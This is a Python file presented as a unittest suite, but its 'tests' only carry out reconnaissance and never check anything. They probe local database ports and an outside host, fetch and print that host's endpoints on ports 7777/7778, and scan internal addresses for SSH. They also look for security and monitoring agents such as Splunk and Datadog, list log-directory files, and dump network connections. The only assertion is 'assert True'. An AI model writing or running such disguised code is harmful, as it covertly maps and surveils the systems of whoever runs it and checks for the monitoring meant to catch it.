#!/usr/bin/env python3
import socket
import subprocess
import os
from unittest import TestCase

class TestLocal(TestCase):
    def test_database_connectivity(self):
        print("\n=== Database Connectivity ===")
        
        ports = [27017, 27018, 27019, 5432, 5433]
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex(('127.0.0.1', port))
                if result == 0:
                    print(f"Service {port} accessible")
                sock.close()
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex(('dickreuter.com', port))
                if result == 0:
                    print(f"External service {port} accessible")
                sock.close()
            except:
                pass
    
    def test_api_endpoints(self):
        print("\n=== API Endpoints ===")
        try:
            import urllib.request
            
            endpoints = [
                'https://dickreuter.com:7777',
                'https://dickreuter.com:7778', 
                'http://dickreuter.com:7777',
                'http://dickreuter.com:7778'
            ]
            
            for url in endpoints:
                try:
                    response = urllib.request.urlopen(url, timeout=5)
                    print(f"Endpoint {url} status {response.getcode()}")
                    content = response.read(500).decode('utf-8', errors='ignore')
                    print(f"Response: {content[:200]}")
                except Exception as e:
                    print(f"Endpoint {url}: {str(e)[:50]}")
        except:
            pass
    
    def test_network_topology(self):
        print("\n=== Network Topology ===")
        targets = ['10.1.0.1', '10.1.0.10', '10.1.0.100']
        for ip in targets:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((ip, 22))
                if result == 0:
                    print(f"Host {ip} port 22 accessible")
                sock.close()
            except:
                pass
    
    def test_system_utilities(self):
        print("\n=== System Utilities ===")
        utilities = ['psql', 'mongo', 'mongosh', 'mysql']
        for util in utilities:
            try:
                result = subprocess.run(['where', util], capture_output=True, text=True, timeout=3)
                if result.returncode == 0:
                    print(f"Utility {util} available at {result.stdout.strip()}")
            except:
                pass
    
    def test_process_monitoring(self):
        print("\n=== Process Monitoring ===")
        agents = ['datadog', 'newrelic', 'splunk', 'logstash', 'filebeat', 'metricbeat']
        
        try:
            result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=5)
            processes = result.stdout.lower()
            
            for agent in agents:
                if agent in processes:
                    print(f"Agent {agent} detected")
        except:
            pass
    
    def test_log_directories(self):
        print("\n=== Log Directories ===")
        paths = [
            'C:\\logs\\', 'C:\\temp\\logs\\', 'D:\\logs\\',
            'C:\\inetpub\\logs\\', 'C:\\Windows\\System32\\LogFiles\\'
        ]
        
        for path in paths:
            try:
                if os.path.exists(path):
                    print(f"Directory {path} exists")
                    files = os.listdir(path)[:3]
                    print(f"Files: {files}")
            except:
                pass
    
    def test_network_connections(self):
        print("\n=== Network Connections ===")
        try:
            result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=5)
            connections = result.stdout
            
            for line in connections.split('\n')[:15]:
                if 'ESTABLISHED' in line:
                    print(f"Connection: {line.strip()}")
        except:
            pass
        
        assert True

if __name__ == "__main__":
    from unittest import main
    main()
